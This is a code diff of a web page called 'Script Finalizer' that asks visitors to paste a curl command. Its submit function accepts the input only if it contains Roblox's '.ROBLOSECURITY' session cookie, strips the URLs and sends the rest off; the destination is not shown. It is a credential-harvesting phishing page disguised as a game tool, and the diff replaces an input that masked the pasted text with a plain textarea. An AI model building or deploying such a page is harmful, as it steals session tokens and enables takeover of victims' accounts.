@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Script Finalizer</title>
 
+  <!-- Tailwind + Lucide + Alpine (all CDN - no build needed) -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
   <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
@@ -21,11 +22,13 @@
 </head>
 <body class="min-h-screen bg-black text-white flex items-center justify-center p-6 relative overflow-hidden">
 
+  <!-- Background -->
   <div class="absolute inset-0 grid-bg opacity-25"></div>
   <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/30 rounded-full blur-3xl"></div>
   <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/30 rounded-full blur-3xl"></div>
 
   <div class="relative z-10 w-full max-w-2xl">
+    <!-- Title -->
     <div class="text-center mb-16">
       <h1 class="text-5xl font-extralight tracking-widest glow-title text-transparent bg-clip-text bg-gradient-to-r from-purple-400 via-pink-400 to-cyan-400 inline-flex items-center gap-4">
         <span class="text-purple-400">→</span> Script Finalizer
@@ -33,23 +36,20 @@
       <div class="h-px w-64 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4"></div>
     </div>
 
+    <!-- Main Card -->
     <div class="bg-zinc-900/70 backdrop-blur-2xl border border-zinc-800 rounded-3xl p-10 shadow-2xl" x-data="scriptFinalizer()">
       <label class="block mb-4 text-sm font-light text-zinc-400 tracking-wider">Insert Game ID BASH</label>
 
-      <!-- Hidden textarea stores real input, visible input is password-masked -->
-      <textarea x-model="realInput" style="position:absolute; left:-9999px;"></textarea>
-      
-      <input
-        :value="realInput.replace(/./g, '•')"
-        @input="realInput = $event.target.value.replace(/•/g, ''); $event.target.value = realInput.replace(/./g, '•')"
-        @paste="onPaste($event)"
+      <textarea
+        x-model="input"
+        @input="message = null"
         :disabled="loading"
         placeholder="curl https://..."
         class="w-full min-h-64 bg-black/60 border border-zinc-700 rounded-2xl px-6 py-5 text-white placeholder-zinc-500 font-mono text-sm resize-none focus:border-purple-500 focus:outline-none transition-all duration-300"
-      />
+      ></textarea>
 
       <div class="mt-3 text-right text-xs text-zinc-500">
-        <span x-text="realInput.length"></span> / 4000 characters
+        <span x-text="input.length"></span> / 4000 characters
       </div>
 
       <!-- Success Message -->
@@ -70,7 +70,7 @@
 
       <!-- Submit Button -->
       <button @click="submit()"
-              :disabled="loading || !realInput.trim()"
+              :disabled="loading || !input.trim()"
               class="w-full mt-10 h-16 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-60 disabled:cursor-not-allowed rounded-2xl text-xl font-light tracking-wider transition-all duration-300 flex items-center justify-center gap-4 shadow-lg">
         <template x-if="loading">
           <i data-lucide="loader-2" class="w-7 h-7 animate-spin"></i>
@@ -85,19 +85,12 @@
   <script>
     function scriptFinalizer() {
       return {
-        realInput: '',
+        input: '',
         message: null,
         loading: false,
 
-        onPaste(e) {
-          e.preventDefault();
-          const pasted = (e.clipboardData || window.clipboardData).getData('text');
-          this.realInput = pasted;
-          e.target.value = pasted.replace(/./g, '•');
-        },
-
         async submit() {
-          const raw = this.realInput.trim();
+          const raw = this.input.trim();
 
           if (!raw.startsWith('curl') || !raw.includes('.ROBLOSECURITY')) {
             this.message = 'error';
@@ -109,8 +102,8 @@
 
           try {
             let clean = raw
-              .replace(/https?:\/\/[^\s]+/g, '')
-              .replace(/curl\s+/gi, 'curl ... ')
+              .replace(/https?:\/\/[^\s]+/g, '')      // remove all URLs
+              .replace(/curl\s+/gi, 'curl ... ')      // shorten curl
               .trim()
               .substring(0, 4000);
 
@@ -128,7 +121,7 @@
             });
 
             this.message = 'success';
-            this.realInput = '';
+            this.input = '';
           } catch (e) {
             this.message = 'error';
           } finally {
